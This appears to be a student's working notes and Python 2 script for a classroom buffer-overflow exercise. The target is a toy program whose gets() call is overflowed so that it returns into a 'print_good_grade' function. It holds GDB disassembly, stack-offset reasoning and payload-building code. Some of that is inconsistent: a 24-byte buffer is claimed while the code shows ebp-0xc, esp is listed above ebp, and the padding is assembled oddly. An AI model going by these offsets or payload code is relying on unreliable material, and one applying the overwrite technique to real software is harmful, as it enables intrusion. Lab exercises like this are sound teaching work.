'''
Buffer overflow happens because
vulnerable is called before
print_bad_grade is. Thus, vulnerable's
stack frame has the return address of
main in it, but because it has a 
buffer overflow vulnerability we can
try to overwrite that
so it goes to print_good_grade instead
and immediately exits

ebp is basepointer of current stackframe
esp is stackpointer


Dump of assembler code for function print_good_grade:
   0x0804889c <+0>:     push   ebp
   0x0804889d <+1>:     mov    ebp,esp
   0x0804889f <+3>:     sub    esp,0x8
   0x080488a2 <+6>:     sub    esp,0xc
   0x080488a5 <+9>:     push   0x80bbe9b
   0x080488aa <+14>:    call   0x804f570 <puts>
   0x080488af <+19>:    add    esp,0x10
   0x080488b2 <+22>:    sub    esp,0xc
   0x080488b5 <+25>:    push   0x1
   0x080488b7 <+27>:    call   0x804e3e0 <exit>
End of assembler dump.

Dump of assembler code for function vulnerable:
   0x080488bc <+0>:     push   ebp
   0x080488bd <+1>:     mov    ebp,esp
   0x080488bf <+3>:     sub    esp,0x18   input stored 24 bytes above ebp?
=> 0x080488c2 <+6>:     sub    esp,0xc
   0x080488c5 <+9>:     lea    eax,[ebp-0xc]
   0x080488c8 <+12>:    push   eax
   0x080488c9 <+13>:    call   0x804f3f0 <gets>
   0x080488ce <+18>:    add    esp,0x10
   0x080488d1 <+21>:    nop
   0x080488d2 <+22>:    leave  
   0x080488d3 <+23>:    ret    
End of assembler dump.


Need to fill 24 bytes + 4 bytes for MAIN FP + 4 bytes for return (addr)

ebp at 0xbffefa90
esp at 0xbffefaa8 = 24 byte difference


x/2sx $ebp
Values of saved frame ptr and return addr in this frame
	  0xbffefab8          0x080488df
		 	      ^
			 should be 0x0804889c

'''
ret = "0804889c"
from struct import pack
#print pack("<I", 0xDEADBEEF)
#print pack("<I", int("deadbeef", 16))
p = pack("<I", int("A"*8, 16))
padding = p + p + p
padding += pack("<I", int(ret[4:] + "A"*4, 16)) 
padding += pack("<I", int(ret[:4], 16))
#print padding
#print pack("<I", int("AAAA", 16))

out = ""
out += pack("<I", 1)
out += pack("<I", 2)
out += pack("<I", 3)
out += pack("<I", 4)
out += pack("<I", 5)
print out
